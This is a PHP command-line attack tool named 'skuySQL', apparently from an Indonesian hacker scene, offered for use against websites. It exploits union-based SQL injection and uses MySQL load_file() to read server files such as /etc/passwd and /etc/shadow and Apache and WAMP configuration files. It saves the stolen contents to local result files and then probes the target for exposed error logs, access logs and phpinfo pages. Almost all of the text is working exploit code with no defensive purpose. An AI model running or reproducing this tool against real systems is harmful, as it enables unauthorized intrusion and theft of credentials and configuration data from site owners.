<?php 
	
	

	error_reporting(0);	
	echo "
                       Z                   
        .,.,        z           
      (((((())    z             
     ((('_  _`) '               
     ((G   \ |)     _skuySQL - Mr CR45H  - { E U C T }    
    (((`   '' ,                  
     .((\.:~:          .--------------.    
     __.| `''.__      | \              |     
  .~~   `---'   ~.    |  .             :     
 /                `   |   `-.__________)     
|             ~       |  :             :   
|                     |  :  |              
|    _                |     |   [ ##   :   
 \    ~~-.            |  ,   oo_______.'   
  `_   ( \) _____/~~~~ `--___              
  | ~`-)  ) `-.   `---   ( - a:f -       v.1.0.1
  |   '///`  | `-.                 

  ex: http://domen.com/injection' union select 1,{exploit},3-- -
";

	/* config */
	$_serverOs = '';
	$_sslVerify = [
	    "ssl" => [
	        "verify_peer" => false,
	        "verify_peer_name" => false,
	    ],
	];

	/* get url */
	echo "\n\n[+] Masukan URL : ";
	$url = trim(fgets(STDIN));

	$_file = explode("/", $url);
	$_domain = $_file[0].'//'.$_file[2];
	
	/* explode and change {exploit} */
	$_ex = explode("{exploit}", $url);

	/* detected os server */
	echo "\n[+] Detected OS Server, please wait..."; sleep(2);
	$_os = file_get_contents($_ex[0]."load_file('/etc/passwd')".$_ex[1], false, stream_context_create($_sslVerify));

	if(preg_match("/root:x/", $_os)){
		$_serverOs = 'Linux';
	}else{
		$_serverOs = 'Windows';
	}
	echo "\n[+] OS Server is <".$_serverOs.">";
	echo "\n[+] Starting ".date('d/m/Y H:i:s')."\n"; sleep(2);

	if ($_serverOs == 'Linux') {
		$_wl = ['/etc/passwd', '/etc/shadow', '/etc/group', '/etc/hosts', '/etc/apache2/logs/access.log', '/etc/httpd/access.log', '/etc/init.d/apache/httpd.conf', '/etc/init.d/apache/httpd.conf', '/etc/init.d/apache2/httpd.conf', '/usr/local/apache2/conf/httpd.conf', '/usr/local/apache/conf/httpd.conf', '/home/apache/httpd.conf', '/home/apache/conf/httpd.conf', '/opt/apache/conf/httpd.conf', '/etc/httpd/httpd.conf', '/etc/httpd/conf/httpd.conf', '/etc/apache/apache.conf', '/etc/apache/httpd.conf', '/etc/apache2/apache2.conf', '/etc/apache2/httpd.conf', '/usr/local/apache2/conf/httpd.conf', '/usr/local/apache/conf/httpd.conf', '/opt/apache/conf/httpd.conf', '/home/apache/httpd.conf', '/home/apache/conf/httpd.conf', '/etc/apache2/sites-available/default', '/etc/apache2/vhosts.d/default_vhost.include', '/var/www/vhosts/sitename/httpdocs/', '/etc/init.d/apache'];
	}else{
		$_wl = ['C:/wamp/bin/apache/logs/access.log', 'C:/wamp/bin/mysql/mysql5.5.24/wampserver.conf', 'C:/wamp/bin/apache/apache2.2.22/conf/httpd.conf', 'C:/wamp/bin/apache/apache2.2.22/conf/wampserver.conf', 'C:/wamp/bin/apache/apache2.2.22/conf/httpd.conf.build', 'C:/wamp/bin/apache/apache2.2.22/conf/httpd.conf.build'];
	}

	/* looping wordlist */
	$_div1 = '<skuySQL>';
	$_div2 = '</skuySQL>';
	$_data = [];

	foreach ($_wl as $nos => $key) {
		$_exs  = "load_file('".$key."')";
		$_urlExploit = base64_encode($_ex[0]."group_concat('".$_div1."',".$_exs.",'".$_div2."')".$_ex[1]);
		$_exploit = file_get_contents(base64_decode($_urlExploit), false, stream_context_create($_sslVerify));

		preg_match('/<skuySQL>(.+)<\/skuySQL>/si', $_exploit, $_output);
		if (count($_output) > 0) {
			echo "\n[+][SUCCESS] => ".$key;
			$_data[] = [$nos];
		}else{
			echo "\n[-][ERROR] => ".$key;
		}
	}	

	echo "\n\n[+] ".count($_data)." Found.\n\n";

	if (count($_data) > 0) {


		/* cek folder */
		$_file = explode("/", $url);
		if (!is_dir("result")) {
			mkdir("result");
		}

		foreach ($_data as $key) {
			echo "- ".$_wl[$key[0]]."\n";
			$_exs  = "load_file('".$_wl[$key[0]]."')";
			$_urlExploit = base64_encode($_ex[0]."group_concat('".$_div1."',".$_exs.",'".$_div2."')".$_ex[1]);
			$_exploit = file_get_contents(base64_decode($_urlExploit), false, stream_context_create($_sslVerify));

			preg_match('/<skuySQL>(.+)<\/skuySQL>/si', $_exploit, $_output);

			$output = "- ".$_wl[$key[0]]."\n".$_output[1]."\n";

			$o = fopen('result/'.$_file[2].".txt", 'a');
			fwrite($o, $output);
			fclose($o);
		}
		echo "\n[+] Created Result in 'result/$_file[2]'";
	}else{
		echo "Bye!\n\n"; exit();die();
	}

	/* finding error_log */
	echo "\n[+] Finding Error Log, please wait..."; sleep(2);
	$_check = file_get_contents($_domain, false, stream_context_create($_sslVerify));

	preg_match_all("/href=\"(.*?)\"/", $_check, $_get);

	$_checks = [];
	foreach ($_get[1] as $key) {
		if (preg_match("/http|https/", $key)) {
			# code...
		}else{
			$_getPath = explode("/", $key);
			if (count($_getPath) > 1) {
				$_checks[$_getPath[0]] = $_getPath[0];
			}
		}
	}

	$_file = explode("/", $url);
	
	/* checking error_log */	
	function _errorLog($_checks, $_file, $log){
		echo "\n\n[+] Trying Access Log : $log file";
		foreach ($_checks as $key) {
			$_domen = $_file[0]."//".$_file[2]."/".$key."/".$log;
			
			$_getHeader = get_headers($_domen);
			if (preg_match("/200/", $_getHeader[0])) {
				echo "\n[200 OK] $_domen";
			}elseif(preg_match("/403/", $_getHeader[0])){
				echo "\n[403 Forbidden] $_domen";
			}else{
				// 404 atau semacam nya
				echo "\n[404 Not Found] $_domen";
			}
		}
	}

	_errorLog($_checks, $_file, 'error_log');
	_errorLog($_checks, $_file, 'error.log');
	_errorLog($_checks, $_file, 'access.log');

	function _getPhpInfo($domain){
		echo "\n\n[+] Trying finding PHP Info";

		$_domain = $domain."/phpinfo.php";
		$_getHeader = get_headers($_domain);
		if (preg_match("/200/", $_getHeader[0])) {
			echo "\n[200 OK] $_domain";
			file_get_contents($domain, false, stream_context_create($_sslVerify));
		}elseif(preg_match("/403/", $_getHeader[0])){
			echo "\n[403 Forbidden] $_domain";
		}else{
			// 404 atau semacam nya
			echo "\n[404 Not Found] $_domain";
		}
	}
	_getPhpInfo($_domain);
	echo "\n\n";
?>
